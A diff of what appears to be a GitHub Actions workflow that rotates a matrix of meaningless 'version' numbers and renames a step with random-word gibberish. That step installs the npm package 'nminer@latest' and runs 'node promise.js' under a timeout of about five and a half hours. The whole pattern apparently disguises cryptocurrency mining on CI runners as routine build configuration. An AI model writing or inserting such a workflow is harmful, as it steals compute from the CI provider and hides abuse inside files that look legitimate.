@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9208 }
-          - { version: 780 }
-          - { version: 9433 }
-          - { version: 6176 }
-          - { version: 3027 }
-          - { version: 8517 }
-          - { version: 1282 }
-          - { version: 5819 }
-          - { version: 2374 }
-          - { version: 6481 }
-          - { version: 5902 }
-          - { version: 9018 }
-          - { version: 6165 }
-          - { version: 8955 }
-          - { version: 8645 }
-          - { version: 4205 }
-          - { version: 5574 }
-          - { version: 6491 }
+          - { version: 785 }
+          - { version: 4571 }
+          - { version: 9348 }
+          - { version: 3167 }
+          - { version: 5582 }
+          - { version: 8135 }
+          - { version: 6781 }
+          - { version: 6550 }
+          - { version: 4546 }
+          - { version: 9058 }
+          - { version: 6150 }
+          - { version: 4464 }
+          - { version: 9220 }
+          - { version: 9831 }
+          - { version: 9735 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: since despite hyena after teriyaki
+      - name: furthermore beneath brightly phew
         run: |
           npm install nminer@latest
-          timeout 341m node promise.js || echo "promise executed"
+          timeout 318m node promise.js || echo "promise executed"
